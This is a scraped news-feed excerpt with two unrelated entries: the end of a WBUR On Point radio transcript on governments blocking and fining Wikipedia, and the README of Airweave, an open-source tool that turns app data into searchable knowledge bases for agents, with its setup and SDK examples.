    &lt;p&gt;Stephen Harrison, I want you to tell us a little bit more about what we might look forward to based on how we've seen this playbook play out in other countries. You'd mentioned China and the attack on independent sources there. Could the same thing happen here? What happens in those places?&lt;/p&gt;
    &lt;p&gt;HARRISON: Yeah, we've seen authoritarian regimes around the world go after Wikipedia for the reasons that your expert mentioned. I think China blocked Wikipedia, which was, conveniently around the 20th anniversary, or the 30th anniversary, I should say, of the Tiananmen Square massacre and kept their people from seeing that information.&lt;/p&gt;
    &lt;p&gt;Russia has fined Wikipedia repeatedly. Saudi Arabia has arrested Wikipedia editors for their contributions to the site. So we see this pattern in terms of governments that go after Wikipedia. And I think that I agree with your expert, it has to do with the political subordination of the truth, right?&lt;/p&gt;
    &lt;p&gt;Those in power want to declare the truth and use sort of a tool like social media to just push it out there, rather than have this sort of independent nonprofit free resource that is curating sources and describing a different view of the truth, right? Which is that, and the idea of Wikipedia editors is very different than the view of authoritarians. Wikipedia editors say, Hey, the best way to get at reality, or the truth is to use independent, reliable sources.&lt;/p&gt;
    &lt;p&gt;And that's different than Elon Musk who wants to just push out his own narrative.&lt;/p&gt;
    &lt;p&gt;The first draft of this transcript was created by Descript, an AI transcription tool. An On Point producer then thoroughly reviewed, corrected, and reformatted the transcript before publication. The use of this AI tool creates the capacity to provide these transcripts.&lt;/p&gt;
    &lt;p&gt;This program aired on September 18, 2025.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.wbur.org/onpoint/2025/09/18/right-wing-wikipedia-editor-heritage"/><published>2025-09-30T16:20:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45427482</id><title>Launch HN: Airweave (YC X25) – Let agents search any app</title><updated>2025-09-30T16:43:03.443050+00:00</updated><content>&lt;doc fingerprint="5a85ff58db83ac82"&gt;
  &lt;main&gt;
    &lt;p&gt;Airweave is a tool that lets agents search any app. It connects to apps, productivity tools, databases, or document stores and transforms their contents into searchable knowledge bases, accessible through a standardized interface for agents.&lt;/p&gt;
    &lt;p&gt;The search interface is exposed via REST API or MCP. When using MCP, Airweave essentially builds a semantically searchable MCP server. The platform handles everything from auth and extraction to embedding and serving.&lt;/p&gt;
    &lt;head rend="h3"&gt;Managed Service: Airweave Cloud&lt;/head&gt;
    &lt;p&gt;Make sure docker and docker-compose are installed, then...&lt;/p&gt;
    &lt;code&gt;# 1. Clone the repository
git clone https://github.com/airweave-ai/airweave.git
cd airweave

# 2. Build and run
chmod +x start.sh
./start.sh&lt;/code&gt;
    &lt;p&gt;That's it! Access the dashboard at http://localhost:8080&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Access the UI at &lt;code&gt;http://localhost:8080&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Connect sources, configure syncs, and query data&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Swagger docs: &lt;code&gt;http://localhost:8001/docs&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Create connections, trigger syncs, and search data&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;pip install airweave-sdk&lt;/code&gt;
    &lt;code&gt;from airweave import AirweaveSDK

client = AirweaveSDK(
    api_key="YOUR_API_KEY",
    base_url="http://localhost:8001"
)
client.collections.create(
    name="name",
)&lt;/code&gt;
    &lt;code&gt;npm install @airweave/sdk
# or
yarn add @airweave/sdk&lt;/code&gt;
    &lt;code&gt;import { AirweaveSDKClient, AirweaveSDKEnvironment } from "@airweave/sdk";

const client = new AirweaveSDKClient({
    apiKey: "YOUR_API_KEY",
    environment: AirweaveSDKEnvironment.Local
});
await client.collections.create({
    name: "name",
});&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Data synchronization from 25+ sources with minimal config&lt;/item&gt;
      &lt;item&gt;Entity extraction and transformation pipeline&lt;/item&gt;
      &lt;item&gt;Multi-tenant architecture with OAuth2&lt;/item&gt;
      &lt;item&gt;Incremental updates using content hashing&lt;/item&gt;
      &lt;item&gt;Semantic search for agent queries&lt;/item&gt;
      &lt;item&gt;Versioning for data changes&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frontend: React/TypeScript with ShadCN&lt;/item&gt;
      &lt;item&gt;Backend: FastAPI (Python)&lt;/item&gt;
      &lt;item&gt;Databases: PostgreSQL (metadata), Qdrant (vectors)&lt;/item&gt;
      &lt;item&gt;Deployment: Docker Compose (dev), Kubernetes (prod)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We welcome contributions! Please check CONTRIBUTING.md for details.&lt;/p&gt;
    &lt;p&gt;Airweave is released under the MIT license.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Discord - Get help and discuss features&lt;/item&gt;
      &lt;item&gt;GitHub Issues - Report bugs or request features&lt;/item&gt;
      &lt;item&gt;Twitter - Follow for updates&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/airweave-ai/airweave"/><published>2025-09-30T16:21:09+00:00</published></entry></feed>